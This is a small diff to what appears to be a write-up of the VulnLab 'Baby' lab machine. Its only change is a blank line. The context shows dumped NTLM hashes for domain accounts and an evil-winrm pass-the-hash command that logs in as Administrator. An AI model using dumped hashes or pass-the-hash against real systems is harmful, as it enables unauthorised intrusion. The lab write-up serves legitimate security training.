@@ -1199,6 +1199,7 @@ baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25
 baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
 ```
 - Now that we have hash, then we can exploit use pass the hash
+  
 ```
 ┌──(kali㉿kali)-[~/vulnlab/Baby]
 └─$ evil-winrm -i 10.10.65.1 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
